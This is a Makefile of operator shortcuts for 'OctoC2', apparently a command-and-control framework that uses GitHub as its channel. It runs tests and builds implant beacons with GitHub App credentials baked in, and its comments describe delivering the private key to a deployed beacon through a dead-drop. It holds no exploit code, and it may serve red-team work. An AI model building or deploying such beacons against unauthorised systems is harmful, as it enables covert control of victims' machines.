# OctoC2 — operator shortcuts
#
# Usage:
#   make test          — run all unit tests (implant + server + octoctl + dashboard)
#   make agent-app     — build a beacon binary baked with GitHub App credentials
#   make clean         — remove build artefacts

.PHONY: test agent-app clean

# ── Unit tests ────────────────────────────────────────────────────────────────

test:
	@echo "==> implant"
	cd implant  && bun test
	@echo "==> server"
	cd server   && bun test
	@echo "==> octoctl"
	cd octoctl  && bun test
	@echo "==> dashboard"
	cd dashboard && bun test

# ── Build beacon with GitHub App credentials baked in ─────────────────────────
#
# Required env vars:
#   OCTOC2_APP_ID            — numeric GitHub App ID
#   OCTOC2_INSTALLATION_ID   — installation ID for the C2 repo
#
# Private key is NOT baked — deliver it via dead-drop after deployment:
#   bun run octoctl/src/index.ts drop create --beacon <id> --app-key-file ~/.config/octoc2/app-key.pem

agent-app:
ifndef OCTOC2_APP_ID
	$(error OCTOC2_APP_ID is not set)
endif
ifndef OCTOC2_INSTALLATION_ID
	$(error OCTOC2_INSTALLATION_ID is not set)
endif
	@echo "==> Building beacon with App ID=$(OCTOC2_APP_ID) Installation=$(OCTOC2_INSTALLATION_ID)"
	cd octoctl && bun run src/index.ts build-beacon \
		--outfile ../beacon-agent-app \
		--app-id $(OCTOC2_APP_ID) \
		--installation-id $(OCTOC2_INSTALLATION_ID)
	@echo "==> Built: beacon-agent-app"
	@echo "==> Next: deliver private key via dead-drop"
	@echo "    bun run octoctl/src/index.ts drop create --beacon <id> --app-key-file ~/.config/octoc2/app-key.pem"

# ── Clean ─────────────────────────────────────────────────────────────────────

clean:
	rm -f beacon-agent-app beacon-prod
